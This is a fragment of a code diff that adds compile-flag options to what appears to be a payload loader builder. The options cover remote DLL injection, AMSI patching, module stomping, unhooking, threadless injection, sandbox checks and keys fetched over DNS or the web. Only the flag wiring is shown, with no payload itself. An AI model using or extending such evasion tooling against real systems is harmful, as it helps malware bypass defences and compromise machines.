+if (remoteinject and (remoteAMSIpatch or stomb)):
+    stub.add(RemoteLoadDllStub)
 
 # Only decrypt when sandbox Checks/Unhooking/Sleep is done
 stub.add(getRandStub())
@@ -3133,6 +3592,30 @@ elif (retrieveFromURL):
 else:
     basicCompileFlags.add("-d:PayloadEmbedded ")
 
+if(customKey):
+    basicCompileFlags.add("-d:customKey ")
+
+if(usekeyFile or usednsKey or webKey):
+    basicCompileFlags.add("-d:noKey ")
+    if(useKeyFile):
+        basicCompileFlags.add("-d:keyFromFile ")
+    elif(usednsKey):
+        basicCompileFlags.add("-d:dnsKey ")
+    elif(webKey):
+        basicCompileFlags.add("-d:webKey ")
+
+if(stomb):
+    basicCompileFlags.add("-d:stomb ")
+
+if(restore):
+    basicCompileFlags.add("-d:restore ")
+
+if (carokann):
+    basicCompileFlags.add("-d:carokann ")
+
+if(suspended):
+    basicCompileFlags.add("-d:suspended ")
+
 if(dripallocate):
     basicCompileFlags.add("-d:AllocateDripStyle ")
 
@@ -3190,6 +3673,9 @@ if(service):
 
 if(unhook):
     basicCompileFlags.add("-d:unhook ")
+
+if(threadless):
+    basicCompileFlags.add("-d:threadless ")
 
 if(dllProxy):
     when system.hostOS == "windows":
